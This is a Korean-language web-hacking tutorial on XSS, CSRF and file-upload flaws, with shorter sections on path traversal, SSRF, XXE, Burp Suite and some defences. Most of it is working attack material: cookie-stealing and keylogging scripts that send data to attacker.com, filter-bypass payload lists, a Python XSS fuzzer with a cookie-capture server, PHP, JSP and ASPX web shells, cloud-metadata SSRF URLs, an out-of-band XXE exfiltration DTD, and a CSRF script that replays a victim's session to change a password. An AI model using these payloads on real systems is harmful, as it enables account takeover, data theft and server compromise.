> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# XSS / CSRF / 파일 업로드 취약점

## 0. 초보자를 위한 개념 이해

### XSS/CSRF/파일 업로드 취약점이란?

이 세 가지는 웹 해킹에서 가장 빈번하게 발생하는 클라이언트 측 공격입니다. XSS는 악성 스크립트 삽입, CSRF는 사용자 모르게 요청 위조, 파일 업로드는 서버에 악성 코드를 올리는 방식으로 동작합니다.

**왜 배우는가:**
```
실제 공격 시나리오:

  XSS (세션 탈취):
    공격자가 게시판에 악성 스크립트 게시
    → 피해자가 글 읽으면 쿠키가 공격자 서버로 전송
    → 공격자가 피해자 세션으로 로그인

  CSRF (계정 탈취):
    공격자가 이메일로 링크 전송
    → 피해자 클릭 → 피해자 브라우저가 모르게 패스워드 변경 요청
    → 피해자 계정을 공격자가 장악

  파일 업로드 (웹쉘):
    프로필 사진 업로드 → shell.php 업로드
    → /uploads/shell.php 접속
    → 서버에서 시스템 명령어 실행!
```

### 핵심 개념 정리

```
각 취약점 핵심 원리:

  XSS 발생 조건:
    사용자 입력 → 검증 없이 HTML에 반영
    <script>alert('XSS')</script> → 그대로 출력 → 실행됨
    대응: HTML 특수문자 이스케이프 (&lt; &gt; &quot;)

  CSRF 발생 조건:
    서버가 요청의 출처(Origin)를 검증하지 않음
    피해자가 이미 로그인된 상태에서 공격자 링크 클릭
    → 쿠키가 자동으로 포함되어 요청 전송
    대응: CSRF 토큰, SameSite 쿠키, Referer 검증

  파일 업로드 발생 조건:
    파일 확장자만 검사 (shell.php → shell.php.jpg 우회)
    MIME 타입만 검사 (Content-Type 변조 우회)
    대응: 화이트리스트 확장자, 파일 내용 검사, 업로드 폴더 실행 금지
```

### 필요한 도구 및 환경
- **취약한 웹 앱**: DVWA, WebGoat, bWAPP — 세 취약점 모두 포함
- **Burp Suite**: HTTP 요청 가로채기 → Content-Type 변조, CSRF 토큰 분석
- **웹쉘**: 교육용 PHP/JSP/ASPX 웹쉘 코드 — 파일 업로드 취약점 실증

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""파일 업로드 취약점 탐지 — 확장자 우회 시도 (교육용)."""
from pathlib import Path
from dataclasses import dataclass

@dataclass
class UploadTest:
    filename: str
    content_type: str
    description: str

def generate_upload_bypass_cases() -> list[UploadTest]:
    """파일 업로드 우회 테스트 케이스 목록."""
    return [
        UploadTest("shell.php", "image/jpeg", "확장자 PHP, MIME image — 서버가 MIME만 검사 시 우회"),
        UploadTest("shell.php.jpg", "image/jpeg", "이중 확장자 — 일부 서버가 마지막 확장자만 확인"),
        UploadTest("shell.pHp", "image/jpeg", "대소문자 혼용 — 대소문자 구분 없는 서버"),
        UploadTest("shell.php%00.jpg", "image/jpeg", "NULL 바이트 삽입 — PHP 구버전 취약점"),
        UploadTest("shell.phtml", "image/jpeg", "PHP 대체 확장자 — 블랙리스트 우회"),
        UploadTest(".htaccess", "text/plain", "htaccess 업로드 → 디렉토리 설정 변경"),
    ]

def analyze_upload_security(allowed_extensions: list[str]) -> None:
    """업로드 허용 확장자 목록의 보안 분석."""
    dangerous = [".php", ".php3", ".phtml", ".asp", ".aspx", ".jsp", ".cgi"]
    for ext in allowed_extensions:
        if ext.lower() in dangerous:
            print(f"[위험] '{ext}' 허용 → 웹쉘 업로드 가능!")
        else:
            print(f"[안전] '{ext}'")

if __name__ == "__main__":
    print("=== 파일 업로드 우회 테스트 케이스 ===")
    for case in generate_upload_bypass_cases():
        print(f"  파일명: {case.filename:<25} | {case.description}")
    print("\n=== 확장자 보안 분석 ===")
    analyze_upload_security([".jpg", ".png", ".php", ".gif"])
```

---

## 1. XSS (Cross-Site Scripting)

### XSS 유형

| 유형 | 저장 여부 | 설명 |
|------|-----------|------|
| Stored XSS | DB에 저장 | 게시판, 프로필 등에 영구 저장 → 가장 위험 |
| Reflected XSS | 미저장 | URL 파라미터에 삽입 → 피싱 링크 |
| DOM-based XSS | 클라이언트 | JavaScript로 DOM 조작 시 발생 |

---

### 1-1. Stored XSS (저장형)


XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```html
<!-- 게시판 글 작성 시 삽입 -->
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

**실제 공격 시나리오:**
```javascript
// 쿠키 탈취 → 세션 하이재킹
<script>
  new Image().src = "http://attacker.com/steal?c=" + document.cookie;
</script>

// 키로거
<script>
  document.addEventListener('keypress', function(e) {
    new Image().src = "http://attacker.com/key?k=" + e.key;
  });
</script>

// 자격증명 피싱
<script>
  document.body.innerHTML = '<form action="http://attacker.com/phish" method="POST">'
    + '<input name="user" placeholder="Username">'
    + '<input name="pass" type="password" placeholder="Password">'
    + '<input type="submit"></form>';
</script>

// BeEF Hook (브라우저 익스플로잇)
<script src="http://attacker.com:3000/hook.js"></script>
```

---

### 1-2. Reflected XSS (반사형)


XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```
취약한 URL:
http://target.com/search?q=<script>alert(1)</script>

피싱 링크:
http://target.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**URL 인코딩된 페이로드:**
```
http://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

### 1-3. DOM-based XSS


XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```javascript
// 취약한 코드
var name = document.location.hash.substring(1);
document.getElementById('output').innerHTML = name;

// 공격 URL
http://target.com/page#<img src=x onerror=alert(1)>

// location.href 악용
document.write('<a href="' + location.href + '">link</a>');
// 공격: javascript:alert(1) 삽입
```

---

### 1-4. XSS 필터 우회


XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```html
<!-- 태그 필터 우회 -->
<ScRiPt>alert(1)</ScRiPt>                 (대소문자 혼합)
<scr<script>ipt>alert(1)</scr</script>ipt>   (이중 삽입)
<img src=1 onerror=alert(1)>              (이벤트 핸들러)
<svg/onload=alert(1)>
<a href="javascript:alert(1)">click</a>

<!-- 따옴표 없이 -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>             (백틱)

<!-- 공백 우회 -->
<img/src=x/onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

<!-- HTML 엔티티 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">

<!-- 프로토콜 우회 -->
<a href="JaVaScRiPt:alert(1)">
<a href="java&#9;script:alert(1)">    (탭 문자)
<a href="java&#10;script:alert(1)">   (개행)

<!-- CSP 우회 (JSONP 엔드포인트 활용) -->
<script src="https://trusted.com/api?callback=alert(1)"></script>

<!-- SVG 내부 스크립트 -->
<svg><script>alert(1)</script></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>

<!-- 인코딩 우회 -->
<script>alert(1)</script>   (유니코드)
```

---

### 1-5. XSS 쿠키 탈취 서버 만들기


XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```python
#!/usr/bin/env python3
"""
XSS 페이로드 퍼저 + 쿠키 탈취 수신 서버
퍼저: requests로 각 파라미터에 페이로드를 삽입하여 반영 여부 확인
수신 서버: 탈취된 쿠키/데이터를 로깅

사용법:
  # 퍼저 모드
  python3 xss_fuzzer.py fuzz -u "http://target.com/search?q=test"
  # 수신 서버 모드
  python3 xss_fuzzer.py server --port 8080
"""
import argparse
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote

import requests


# ── XSS 페이로드 목록 (필터 우회 포함) ────────────────────────────────────────
XSS_PAYLOADS: list[str] = [
    # 기본 탐지용 마커 (반영 여부 확인)
    "<xss>",
    "\"'><xss>",
    "</script><xss>",

    # 실제 실행 페이로드
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",

    # 이벤트 핸들러 (스크립트 태그 필터 우회)
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",

    # 대소문자 우회
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",

    # JavaScript 프로토콜
    "<a href=\"javascript:alert(1)\">click</a>",
    "<iframe src=\"javascript:alert(1)\">",

    # 인코딩 우회
    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",

    # DOM 싱크 테스트
    "javascript:alert(1)",
    "';alert(1);//",
    "\";alert(1);//",

    # CSP 우회 (nonce 없는 환경)
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
]

STEAL_TEMPLATE = (
    "<script>"
    "fetch('http://ATTACKER_HOST/steal?c='+encodeURIComponent(document.cookie))"
    "</script>"
)


# ── 퍼저 ──────────────────────────────────────────────────────────────────────
class XSSFuzzer:
    def __init__(
        self,
        url: str,
        post_data: Optional[str] = None,
        cookies: Optional[str] = None,
        attacker_host: str = "attacker.com",
        delay: float = 0.2,
    ) -> None:
        self.url = url
        self.post_data = post_data
        self.method = "POST" if post_data else "GET"
        self.attacker_host = attacker_host
        self.delay = delay

        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (XSS-Fuzzer/2.0)"
        if cookies:
            for item in cookies.split(";"):
                k, _, v = item.strip().partition("=")
                self.session.cookies.set(k.strip(), v.strip())

        parsed = urlparse(url)
        self.base_params = (
            {k: v[0] for k, v in parse_qs(parsed.query).items()}
            if self.method == "GET"
            else {pair.split("=")[0]: pair.split("=")[1]
                  for pair in post_data.split("&") if "=" in pair}
        )

    def _send(self, params: dict) -> Optional[requests.Response]:
        try:
            if self.method == "GET":
                return self.session.get(self.url, params=params, timeout=10)
            else:
                return self.session.post(self.url, data=params, timeout=10)
        except requests.RequestException:
            return None

    def _is_reflected(self, resp: Optional[requests.Response], marker: str) -> bool:
        if resp is None:
            return False
        return marker.lower() in resp.text.lower()

    def fuzz(self) -> list[dict]:
        findings = []
        for param in self.base_params:
            print(f"[*] 파라미터: {param}")
            for payload in XSS_PAYLOADS:
                params = {**self.base_params, param: payload}
                resp = self._send(params)
                # 반영 여부 확인 (마커 탐지)
                marker = "<xss>" if "<xss>" in payload else payload[:10]
                if self._is_reflected(resp, marker):
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "status": resp.status_code if resp else None,
                        "url": self.url,
                    })
                    print(f"  [!] 반영 발견! payload: {payload!r}")
                time.sleep(self.delay)
        return findings


# ── 수신 서버 ──────────────────────────────────────────────────────────────────
LOG_FILE = Path("xss_captured.log")

class XSSReceiverHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        captured = {}
        for key in ("c", "cookie", "k", "key", "data", "token"):
            if key in params:
                captured[key] = params[key][0]

        if captured:
            line = f"[{timestamp}] {client_ip}  {captured}\n"
            print(f"[+] 데이터 수신: {line}", end="")
            with LOG_FILE.open("a") as f:
                f.write(line)

        # CORS 허용 + 투명 1px 이미지 응답 (브라우저 오류 방지)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        # 1x1 투명 GIF
        self.wfile.write(b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00"
                         b"\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00"
                         b"\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
                         b"\x44\x01\x00\x3b")

    def log_message(self, fmt: str, *args) -> None:
        pass  # 기본 로그 억제


def run_server(host: str = "0.0.0.0", port: int = 8080) -> None:
    server = HTTPServer((host, port), XSSReceiverHandler)
    print(f"[*] XSS 수신 서버 시작: http://{host}:{port}")
    print(f"[*] 캡처 로그: {LOG_FILE.resolve()}")
    print(f"[*] XSS 페이로드: {STEAL_TEMPLATE.replace('ATTACKER_HOST', f'YOUR_IP:{port}')}")
    server.serve_forever()


# ── CLI ────────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(description="XSS 퍼저 + 수신 서버")
    sub = parser.add_subparsers(dest="cmd", required=True)

    fuzz_p = sub.add_parser("fuzz", help="XSS 퍼징 실행")
    fuzz_p.add_argument("-u", "--url", required=True)
    fuzz_p.add_argument("--post", help="POST 데이터")
    fuzz_p.add_argument("--cookie", help="쿠키 문자열")
    fuzz_p.add_argument("--delay", type=float, default=0.2)

    srv_p = sub.add_parser("server", help="수신 서버 실행")
    srv_p.add_argument("--port", type=int, default=8080)

    args = parser.parse_args()

    if args.cmd == "fuzz":
        fuzzer = XSSFuzzer(args.url, args.post, args.cookie, delay=args.delay)
        results = fuzzer.fuzz()
        print(f"\n[+] 총 {len(results)}개 XSS 반영 지점 발견")
    else:
        run_server(port=args.port)


if __name__ == "__main__":
    main()
```

---

## 2. CSRF (Cross-Site Request Forgery)

### 원리
```
1. 피해자 → 은행 사이트 로그인 (세션 쿠키 발급)
2. 공격자 → 악성 페이지 제작 (자동 요청 코드 삽입)
3. 피해자 → 악성 페이지 방문
4. 브라우저 → 피해자 쿠키와 함께 은행에 요청 자동 전송
5. 은행 → 피해자가 요청한 것으로 간주하여 처리
```

### CSRF 페이로드

**GET 방식 CSRF:**
```html
<!-- 이미지 태그로 자동 요청 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000000">

<!-- iframe 사용 -->
<iframe src="http://bank.com/delete_account" style="display:none">
```

**POST 방식 CSRF:**
```html
<!-- 자동 제출 폼 -->
<form id="csrf" action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**JSON CSRF (Content-Type 우회):**
```html
<!-- application/x-www-form-urlencoded로 JSON 흉내 -->
<form action="http://api.target.com/user/update" method="POST"
      enctype="text/plain">
  <input name='{"admin":true,"ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### CSRF 토큰 우회


CSRF(Cross-Site Request Forgery)는 피해자의 인증 상태를 악용하여 의도치 않은 요청을 보내는 공격입니다. 피해자가 로그인된 상태에서 공격자가 만든 페이지를 방문하면, 피해자의 권한으로 서버에 요청이 전송됩니다.

```
1. CSRF 토큰 미검증 → 토큰 없이 요청
2. Same-site 요청으로 토큰 획득 (XSS 연계)
   - XSS로 토큰 값 읽어서 CSRF 요청에 포함
3. Referrer 헤더 우회
   - Referrer 없이 요청
   - Referrer 위조
4. 예측 가능한 토큰 → 브루트포스
```

---

## 3. 파일 업로드 취약점

### 공격 목표
서버에 웹쉘(악성 스크립트)을 업로드하여 원격 명령 실행(RCE)

### 3-1. 기본 웹쉘

**PHP 웹쉘:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_POST['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php eval($_POST['code']); ?>

<!-- 더 강력한 웹쉘 -->
<?php
$cmd = ($_REQUEST['cmd'] ?? '');
echo '<pre>' . shell_exec($cmd) . '</pre>';
?>
```

**JSP 웹쉘 (Java 서버):**
```jsp
<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
InputStream is = p.getInputStream();
int c;
while ((c = is.read()) != -1) out.print((char)c);
%>
```

**ASPX 웹쉘 (.NET 서버):**
```csharp
<%@ Page Language="C#" %>
<%
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + Request["cmd"];
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.Start();
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

---

### 3-2. 확장자 필터 우회

**PHP 대체 확장자:**
```
.php
.php3  .php4  .php5  .php7
.phtml  .pht  .shtml
.pHp  .PhP  (대소문자 우회)
.php.bak  (이중 확장자)
```

**서버 설정 악용:**
```
.php%00.jpg     (Null byte — PHP 5.3 이하)
.php .jpg       (공백 + 확장자)
.php%20.jpg     (URL 인코딩 공백)
shell.php;.jpg  (세미콜론 우회 — Apache 일부 버전)
```

**Content-Type 우회:**
```
업로드 시 Content-Type: image/jpeg 로 변조
Burp Suite Intercept → Content-Type 수정
```

**파일 시그니처 우회 (Magic Bytes):**
```
PHP 코드 앞에 이미지 헤더 추가:
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

GIF 헤더 + PHP:
GIF89a<?php system($_GET['cmd']); ?>

실제 이미지 파일에 PHP 코드 삽입 (ExifTool):
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

---

### 3-3. 업로드 경로 확인

```bash
# 업로드 후 접근 경로 추측
http://target.com/uploads/shell.php
http://target.com/files/shell.php
http://target.com/media/shell.php
http://target.com/images/shell.php

# 디렉토리 열거
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

---

### 3-4. LFI → 파일 업로드 연계 (Log Poisoning)

```
1. 웹 서버 로그에 PHP 코드 삽입
   User-Agent: <?php system($_GET['cmd']); ?>

2. LFI로 로그 파일 실행
   http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id
```

---

### 3-5. DOM 기반 XSS 소스와 싱크 (Sources & Sinks)


XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```
소스 (Source) — 공격자 입력이 들어오는 지점:
  document.URL
  document.location.href
  document.location.search
  document.location.hash
  document.referrer
  window.name
  postMessage 이벤트 데이터

싱크 (Sink) — 실행으로 이어지는 위험 함수:
  innerHTML, outerHTML        → HTML 삽입 → XSS
  document.write()            → HTML 삽입 → XSS
  eval()                      → JS 실행
  setTimeout(문자열)          → JS 실행
  setInterval(문자열)         → JS 실행
  location.href = 사용자입력  → javascript: 프로토콜
  jQuery.html()               → innerHTML과 동일

DOM XSS 탐지 (Polyglot 페이로드):
  javascript:/*--></title></style></textarea></script></xmp>
  <svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

방어:
  - textContent / innerText 사용 (innerHTML 대신)
  - DOMPurify 라이브러리로 HTML 살균 (sanitize)
  - Trusted Types API (Chrome 75+) 적용
```

### 3-6. 파일 업로드 취약점 — 버그바운티 관점 추가 기법

```
Content-Type 우회 (Burp Suite Intercept 사용):
  1. .php 파일 선택
  2. 요청 가로채기 → Content-Type: image/jpeg 로 변조
  3. 서버가 Content-Type만 검증 시 우회

이중 확장자 공격:
  shell.php.jpg  → Apache mod_mime 취약 설정 시 PHP로 처리
  shell.jpg.php  → 마지막 확장자를 실행 확장자로 처리

IIS 취약점:
  shell.asp;.jpg → IIS 6 취약 버전에서 ASP로 처리

파일 시그니처 조작 (Magic Bytes):
  GIF89a<?php system($_GET['cmd']); ?>
  → 파일 헤더는 GIF, 뒤에 PHP 코드 삽입
  → 이미지 검증 라이브러리를 우회

업로드 후 실행 경로 탐색:
  ffuf -u http://target.com/uploads/FUZZ -w wordlist.txt
  gobuster dir -u http://target.com -w dirs.txt -x php
```

---

## 4. 기타 주요 웹 취약점

### 4-1. Directory Traversal (경로 탐색)

```
http://target.com/download?file=../../../etc/passwd
http://target.com/download?file=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/download?file=....//....//etc/passwd   (필터 우회)
http://target.com/download?file=%2Fetc%2Fpasswd

# 주요 타겟 파일
/etc/passwd          (사용자 목록)
/etc/shadow          (해시된 비밀번호, root 필요)
/etc/hosts
/etc/ssh/sshd_config
/var/log/apache2/access.log
/var/www/html/config.php
/proc/self/environ   (환경 변수 — PHP 코드 삽입 가능)
```

### 4-2. SSRF (Server-Side Request Forgery)

```
# 내부망 탐색
http://target.com/fetch?url=http://192.168.1.1/
http://target.com/fetch?url=http://127.0.0.1/admin

# 클라우드 메타데이터 탈취
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF 우회
http://0.0.0.0/               (127.0.0.1 대체)
http://[::1]/                 (IPv6 루프백)
http://localhost.evil.com/    (DNS 리바인딩)
http://①②⑦.⓪.⓪.①/         (유니코드 숫자)

# SSRF → 내부 서비스 공격
http://target.com/fetch?url=dict://127.0.0.1:6379/   (Redis)
http://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL  (Redis 명령)
```

### 4-3. XXE (XML External Entity)

XML 데이터 예시입니다. XXE(XML External Entity) 인젝션은 XML 파서의 외부 엔티티 처리 기능을 악용하는 웹 취약점입니다.

```xml
<!-- 기본 XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF 연계 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.server/admin">
]>
<data>&xxe;</data>

<!-- 외부 DTD 파일 참조 (Out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&exfil;</data>

<!-- evil.dtd 내용 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
```

---

## 5. Burp Suite 실전 활용

### 필수 기능

```
1. Proxy (Intercept)
   - HTTP/HTTPS 트래픽 가로채기/수정
   - 브라우저 → Burp → 서버

2. Repeater
   - 요청 반복 전송 및 수정
   - 수동 테스트 핵심 도구

3. Intruder (자동화 공격)
   - Sniper: 하나의 파라미터에 페이로드 목록
   - Battering Ram: 모든 파라미터에 동일 페이로드
   - Pitchfork: 여러 파라미터에 각각 다른 페이로드
   - Cluster Bomb: 모든 조합 시도 (브루트포스)

4. Scanner (Pro 버전)
   - 자동 취약점 스캔

5. Decoder
   - URL/Base64/HTML/Hex 인코딩/디코딩

6. Comparer
   - 두 응답 비교 (차이 강조)

7. Sequencer
   - 토큰 랜덤성 분석 (CSRF 토큰, 세션 ID)
```

### Burp로 XSS 찾기

XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```
1. Proxy로 모든 입력 파라미터 식별
2. Repeater에서 각 파라미터에 <xss> 삽입
3. 응답에서 <xss>가 그대로 반환되면 XSS 가능
4. 실제 페이로드 시도 (alert, 쿠키 탈취)
```

### Burp로 SQL Injection 찾기

SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.

```
1. Repeater에서 파라미터에 ' 삽입 → SQL 오류 확인
2. 파라미터에 ' AND '1'='1 vs ' AND '1'='2 응답 비교
3. SQLMap과 연동: --proxy=http://127.0.0.1:8080
```

---

## 6. XSS 방어

### 출력 인코딩 (가장 중요)
```python
# Python (Flask)
from markupsafe import escape
safe_output = escape(user_input)

# HTML 특수문자 인코딩
& → &amp;
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
```

### Content Security Policy (CSP)

HTTP 요청/응답 예시입니다. 웹 취약점 분석 시 실제 HTTP 패킷 구조를 이해하면 정확한 페이로드를 작성하는 데 도움이 됩니다.

```http
# 가장 엄격한 CSP
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'

# nonce 기반 (인라인 스크립트 허용)
Content-Security-Policy: script-src 'nonce-{random_value}'
<script nonce="{random_value}">/* 허용된 스크립트 */</script>
```

### HttpOnly, Secure 쿠키

HTTP 요청/응답 예시입니다. 웹 취약점 분석 시 실제 HTTP 패킷 구조를 이해하면 정확한 페이로드를 작성하는 데 도움이 됩니다.

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

```
HttpOnly  → JavaScript에서 document.cookie 접근 불가 (XSS 쿠키 탈취 방어)
Secure    → HTTPS에서만 쿠키 전송
SameSite=Strict → 외부 사이트에서 쿠키 미전송 (CSRF 방어)
```

### CSRF 토큰 탈취 PoC (XSS 연계)


XSS(Cross-Site Scripting)는 악성 스크립트를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격입니다. 반사형, 저장형, DOM 기반으로 구분되며, 세션 쿠키 탈취나 키로거 삽입에 활용됩니다.

```python
#!/usr/bin/env python3
"""
CSRF 토큰 탈취 PoC — requests를 이용한 CSRF 공격 시뮬레이터
(교육 목적: 취약한 서버에서 CSRF 토큰 미검증 또는 XSS 연계 시 동작 확인)

사용법: python3 csrf_poc.py -t http://target.com/account/change-password \
                            --victim-session "session=abc123" \
                            --new-password "hacked123"
"""
import argparse
import re
from typing import Optional

import requests


class CSRFTokenExtractor:
    """
    세션 쿠키를 이용해 대상 페이지에서 CSRF 토큰을 추출하는 클래스.
    실제 공격에서는 XSS 페이로드가 피해자 브라우저에서 이 역할을 수행함.
    """

    TOKEN_PATTERNS = [
        r'name=["\']csrf[_\-]?token["\'].*?value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'].*?name=["\']csrf[_\-]?token["\']',
        r'<meta\s+name=["\']csrf[_\-]?token["\'].*?content=["\']([^"\']+)["\']',
        r'"csrfToken"\s*:\s*"([^"]+)"',
        r'window\.__csrf\s*=\s*["\']([^"\']+)["\']',
        r'data-csrf=["\']([^"\']+)["\']',
    ]

    def __init__(self, session: requests.Session) -> None:
        self.session = session

    def extract(self, url: str) -> Optional[str]:
        resp = self.session.get(url, timeout=10)
        for pattern in self.TOKEN_PATTERNS:
            match = re.search(pattern, resp.text, re.IGNORECASE | re.DOTALL)
            if match:
                token = match.group(1)
                print(f"[+] CSRF 토큰 탈취 성공: {token[:30]}...")
                return token
        print(f"[-] CSRF 토큰 미발견 (토큰 없이 요청 가능할 수 있음)")
        return None


def simulate_csrf_attack(
    target_url: str,
    victim_session: str,
    form_data: dict,
    referer_spoof: Optional[str] = None,
) -> None:
    """
    피해자 세션으로 CSRF 공격을 시뮬레이션.
    1. 세션으로 원본 페이지에서 CSRF 토큰 추출
    2. 추출한 토큰과 함께 악성 폼 제출
    """
    session = requests.Session()
    # 피해자 세션 쿠키 설정
    for item in victim_session.split(";"):
        k, _, v = item.strip().partition("=")
        session.cookies.set(k.strip(), v.strip())

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (CSRF-PoC/1.0)",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    if referer_spoof:
        session.headers["Referer"] = referer_spoof

    # 원본 페이지에서 CSRF 토큰 추출 시도
    extractor = CSRFTokenExtractor(session)
    token = extractor.extract(target_url)

    # 폼 데이터에 토큰 포함 (있을 경우)
    if token:
        for possible_key in ("csrf_token", "csrftoken", "_token", "authenticity_token"):
            form_data[possible_key] = token
            break

    print(f"\n[*] CSRF 공격 요청 전송: {target_url}")
    print(f"    폼 데이터: {form_data}")

    resp = session.post(target_url, data=form_data, timeout=10,
                        allow_redirects=True)

    print(f"[*] 응답 코드: {resp.status_code}")
    print(f"[*] 응답 크기: {len(resp.text)} bytes")

    # 성공 여부 추론 (비밀번호 변경 시나리오)
    success_hints = ["success", "변경", "updated", "saved", "완료"]
    fail_hints    = ["invalid", "csrf", "forbidden", "403", "error"]

    body_lower = resp.text.lower()
    if any(h in body_lower for h in success_hints):
        print("[!] 공격 성공으로 추정 (응답에 성공 키워드 포함)")
    elif any(h in body_lower for h in fail_hints):
        print("[-] CSRF 방어가 작동 중 (실패 키워드 감지)")
    else:
        print("[?] 결과 불명확 (수동 응답 확인 필요)")


def main() -> None:
    parser = argparse.ArgumentParser(description="CSRF 공격 시뮬레이터 (교육용)")
    parser.add_argument("-t", "--target", required=True,
                        help="대상 URL (예: http://target.com/change-password)")
    parser.add_argument("--victim-session", required=True,
                        help="피해자 세션 쿠키 (예: session=abc123)")
    parser.add_argument("--data", default="new_password=hacked123",
                        help="전송할 폼 데이터 (예: field1=val1&field2=val2)")
    parser.add_argument("--referer", help="위조 Referer 헤더")
    args = parser.parse_args()

    form_data = dict(
        pair.split("=", 1) for pair in args.data.split("&") if "=" in pair
    )
    simulate_csrf_attack(args.target, args.victim_session, form_data, args.referer)


